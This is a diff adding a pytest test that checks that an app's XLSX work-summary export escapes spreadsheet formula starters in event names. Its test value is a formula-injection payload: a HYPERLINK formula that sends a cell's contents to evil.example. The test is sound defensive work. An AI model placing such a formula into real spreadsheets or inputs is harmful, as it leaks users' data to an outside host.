@@ -1314,6 +1314,31 @@ class TestWorkSummaryReport:
             assert len(group.rows) == 1
             assert group.total.hours_served == Decimal("4.0")
 
+    def test_xlsx_export_escapes_formula_starters(self, app, client):
+        """Event names reach the sheet through the generic builder — still inert."""
+        now = datetime.now(timezone.utc)
+        admin, member, me = self._setup(app, "inject")
+        payload = '=HYPERLINK("http://evil.example/"&A1,"Klikni")'
+        with app.app_context():
+            admin = db.session.merge(admin)
+            member = db.session.merge(member)
+            ev = _make_event(
+                db.session.merge(me),
+                payload,
+                EventStatus.COMPLETED,
+                start=now - timedelta(days=2),
+                end=now - timedelta(days=2) + timedelta(hours=2),
+            )
+            _make_assignment(_make_spot(ev), member, admin)
+
+        _login(client, "admin_ws_inject@test.com")
+        from_d, to_d = self._range(now)
+        resp = client.get(f"/reports/work-summary?from_date={from_d}&to_date={to_d}&format=xlsx")
+        assert resp.status_code == 200
+
+        wb = load_workbook(io.BytesIO(resp.data))
+        assert wb["Výkazy"].cell(row=4, column=2).value == "'" + payload
+
     def test_xlsx_export_has_two_sheets_and_numeric_hours(self, app, client):
         now = datetime.now(timezone.utc)
         admin, member, me = self._setup(app, "xlsx")
